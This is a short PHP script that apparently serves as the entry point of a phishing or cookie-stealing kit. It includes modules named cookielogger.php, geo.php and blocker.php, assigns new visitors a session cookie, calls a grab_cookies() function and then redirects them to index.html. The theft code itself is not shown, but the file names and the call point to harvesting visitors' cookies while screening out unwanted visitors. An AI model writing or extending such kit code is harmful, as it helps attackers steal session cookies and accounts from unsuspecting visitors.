<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/geo.php';
require_once __DIR__ . '/cookielogger.php';
require_once __DIR__ . '/blocker.php';
require_once __DIR__ . '/cookies.php';

if (!isset($_COOKIE['sid'])) {
    setcookie('sid', bin2hex(random_bytes(4)), time() + 86400, '/');
    setcookie('email', '', time() - 3600, '/');
    grab_cookies();
}

header('Location: index.html');
exit;